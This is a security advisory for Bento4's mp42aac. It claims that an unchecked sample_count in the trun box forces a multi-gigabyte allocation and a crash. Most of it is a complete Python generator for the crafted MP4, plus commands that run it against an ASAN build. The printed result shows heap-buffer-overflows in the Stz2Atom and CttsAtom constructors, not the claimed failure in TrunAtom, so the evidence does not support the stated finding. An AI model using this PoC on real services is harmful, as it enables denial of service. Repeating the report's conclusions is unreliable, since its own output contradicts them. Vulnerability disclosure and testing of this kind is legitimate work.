## Bug0: AP4_TrunAtom Unchecked sample_count Causes Unbounded Allocation

In `AP4_TrunAtom::AP4_TrunAtom()` in `Ap4TrunAtom.cpp`, the attacker-controlled `sample_count` field read from a trun box is passed directly to `m_Entries.SetItemCount(sample_count)` without any check that it does not exceed the number of entries the box payload can actually contain, allowing a crafted value of `0x10000000` to trigger a multi-gigabyte allocation request that causes `std::bad_alloc` and process termination.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
"""
PoC generator for AP4_TrunAtom Unchecked sample_count (vuln 005).
Sets sample_count=0x10000000 in a trun box to trigger unbounded allocation.
"""
import struct

def box(box_type, payload):
    size = 8 + len(payload)
    return struct.pack('>I', size) + box_type + payload

def fullbox(box_type, version, flags, payload):
    fb_header = bytes([version]) + struct.pack('>I', flags)[1:]
    return box(box_type, fb_header + payload)

def make_ftyp():
    payload = b'iso5' + struct.pack('>I', 0) + b'isom' + b'iso5' + b'mp41'
    return box(b'ftyp', payload)

def make_mvhd():
    payload = struct.pack('>IIII', 0, 0, 44100, 0)
    payload += struct.pack('>I', 0x00010000)
    payload += struct.pack('>H', 0x0100)
    payload += b'\x00' * 10
    payload += struct.pack('>9I', 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)
    payload += b'\x00' * 24
    payload += struct.pack('>I', 2)
    return fullbox(b'mvhd', 0, 0, payload)

def make_tkhd():
    payload = struct.pack('>IIII', 0, 0, 1, 0)
    payload += struct.pack('>I', 0)
    payload += b'\x00' * 8
    payload += struct.pack('>HH', 0, 0)
    payload += struct.pack('>H', 0x0100)
    payload += b'\x00' * 2
    payload += struct.pack('>9I', 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)
    payload += struct.pack('>II', 0, 0)
    return fullbox(b'tkhd', 0, 3, payload)

def make_mdhd():
    payload = struct.pack('>IIII', 0, 0, 44100, 0)
    payload += struct.pack('>HH', 0x55C4, 0)
    return fullbox(b'mdhd', 0, 0, payload)

def make_hdlr():
    payload = struct.pack('>I', 0)
    payload += b'soun'
    payload += b'\x00' * 12
    payload += b'SoundHandler\x00'
    return fullbox(b'hdlr', 0, 0, payload)

def make_smhd():
    payload = struct.pack('>HH', 0, 0)
    return fullbox(b'smhd', 0, 0, payload)

def make_dref():
    url_entry = fullbox(b'url ', 0, 1, b'')
    payload = struct.pack('>I', 1) + url_entry
    return fullbox(b'dref', 0, 0, payload)

def make_dinf():
    return box(b'dinf', make_dref())

def make_stsd():
    payload = struct.pack('>I', 0)
    return fullbox(b'stsd', 0, 0, payload)

def make_stts():
    payload = struct.pack('>I', 0)
    return fullbox(b'stts', 0, 0, payload)

def make_stsc():
    payload = struct.pack('>I', 0)
    return fullbox(b'stsc', 0, 0, payload)

def make_stsz():
    payload = struct.pack('>II', 0, 0)
    return fullbox(b'stsz', 0, 0, payload)

def make_stco():
    payload = struct.pack('>I', 0)
    return fullbox(b'stco', 0, 0, payload)

def make_stbl():
    payload = make_stsd() + make_stts() + make_stsc() + make_stsz() + make_stco()
    return box(b'stbl', payload)

def make_minf():
    payload = make_smhd() + make_dinf() + make_stbl()
    return box(b'minf', payload)

def make_mdia():
    payload = make_mdhd() + make_hdlr() + make_minf()
    return box(b'mdia', payload)

def make_trak():
    payload = make_tkhd() + make_mdia()
    return box(b'trak', payload)

def make_trex():
    payload = struct.pack('>IIIII', 1, 1, 0, 0, 0)
    return fullbox(b'trex', 0, 0, payload)

def make_mvex():
    return box(b'mvex', make_trex())

def make_moov():
    payload = make_mvhd() + make_mvex() + make_trak()
    return box(b'moov', payload)

def make_mfhd():
    payload = struct.pack('>I', 1)
    return fullbox(b'mfhd', 0, 0, payload)

def make_tfhd():
    payload = struct.pack('>I', 1)
    return fullbox(b'tfhd', 0, 0x000000, payload)

def make_trun_malicious():
    # flags=0x000000: no optional fields; sample_count triggers huge allocation
    SAMPLE_COUNT = 0x10000000
    payload = struct.pack('>I', SAMPLE_COUNT)
    return fullbox(b'trun', 0, 0x000000, payload)

def make_traf():
    payload = make_tfhd() + make_trun_malicious()
    return box(b'traf', payload)

def make_moof():
    payload = make_mfhd() + make_traf()
    return box(b'moof', payload)

def make_mdat():
    return box(b'mdat', b'')

mp4 = make_ftyp() + make_moov() + make_moof() + make_mdat()
with open('poc_input.mp4', 'wb') as f:
    f.write(mp4)
print(f"[+] Written {len(mp4)} bytes to poc_input.mp4")
print(f"[+] trun sample_count = 0x10000000 ({0x10000000})")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000191 at pc 0x5612d099bb62 bp 0x7fff8178f570 sp 0x7fff8178f560
SUMMARY: AddressSanitizer: heap-buffer-overflow (/data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac+0xc51b61) in AP4_Stz2Atom::AP4_Stz2Atom(unsigned int, unsigned char, unsigned int, AP4_ByteStream&)
ERROR: AddressSanitizer: heap-buffer-overflow on address 0x5020000000f1 at pc 0x55d00e596094 bp 0x7ffc7cb3e2e0 sp 0x7ffc7cb3e2d0
SUMMARY: AddressSanitizer: heap-buffer-overflow (/data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac+0xaa1093) in AP4_CttsAtom::AP4_CttsAtom(unsigned int, unsigned char, unsigned int, AP4_ByteStream&)

### Impact

An attacker who supplies a crafted MP4 file to any service invoking mp42aac can trigger an unbounded memory allocation request of several gigabytes in `AP4_TrunAtom::AP4_TrunAtom()`, causing the process to terminate with `std::bad_alloc` and constituting a reliable denial-of-service condition. On platforms or configurations where the allocator returns null instead of throwing, the unchecked return value of `SetItemCount` means subsequent array accesses in the entry-reading loop operate on an uninitialized or null pointer, potentially escalating to memory corruption. The attack surface covers any pipeline that parses untrusted fragmented MP4 input through Bento4.
